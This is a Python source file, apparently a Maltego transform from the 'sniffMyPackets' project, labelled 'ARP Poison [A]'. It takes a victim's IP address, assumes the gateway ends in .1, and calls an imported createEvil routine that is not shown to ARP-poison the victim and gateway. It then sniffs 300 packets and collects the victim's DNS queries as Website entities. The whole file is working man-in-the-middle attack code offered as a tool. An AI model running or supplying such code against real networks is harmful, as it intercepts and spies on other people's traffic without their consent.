#!/usr/bin/env python


import re
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from common.evilarp import createEvil
from canari.maltego.entities import IPv4Address, Website
from canari.maltego.utils import debug, progress
from canari.framework import configure #, superuser

__author__ = 'catalyst256'
__copyright__ = 'Copyright 2013, Sniffmypackets Project'
__credits__ = []

__license__ = 'GPL'
__version__ = '0.1'
__maintainer__ = 'catalyst256'
__email__ = 'catalyst256@gmail.com'
__status__ = 'Development'

__all__ = [
    'dotransform'
]


#@superuser
@configure(
    label='ARP Poison [A]',
    description='ARP Poisons a machine and default gateway',
    uuids=[ 'sniffMyPackets.v2.ARP_Poison' ],
    inputs=[ ( 'sniffMyPackets', IPv4Address ) ],
    debug=True
)
def dotransform(request, response):
	
	dns_results = []
	
	# Collect all the necessary IP addresses and MAC addresses for the victim, default gateway and attacker machine
	victimip = request.value
	victimMAC = ''
	intialip = re.search('[0-9]*\.[0-9]*\.[0-9]*\.', request.value)
	gatewayip = str(intialip.group()) + '1'
	gatewayMAC = ''
	interface = ''
	
	if 'ethernet.hwaddr' in request.fields:
	  victimMAC = request.fields['ethernet.hwaddr']
	if 'gateway.hwaddr' in request.fields:
	  gatewayMAC = request.fields['gateway.hwaddr']
	
	for x in conf.route.routes:
	  if x[2] == gatewayip:
		interface = x[3]
	
	# Define the interface within Scapy for sending the packets (defaults to eth0) so this allows for wlan attacks as well
	conf.iface=interface

	# Setup  a simple Scapy definition for collecting DNS requests and returning a Maltego entity
	def dnsSnoop(pkt):
	  if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
		x = pkt.getlayer(DNS).qd.qname
		if x not in dns_results:
		  dns_results.append(x)
	  
	
	loop = True
	while loop:
	  
	  createEvil(victimip, gatewayip, victimMAC, gatewayMAC)
	  pkt = sniff(iface=interface,prn=dnsSnoop, count=300)
	  for item in dns_results:
		e = Website(item)
		response += e
	  return response
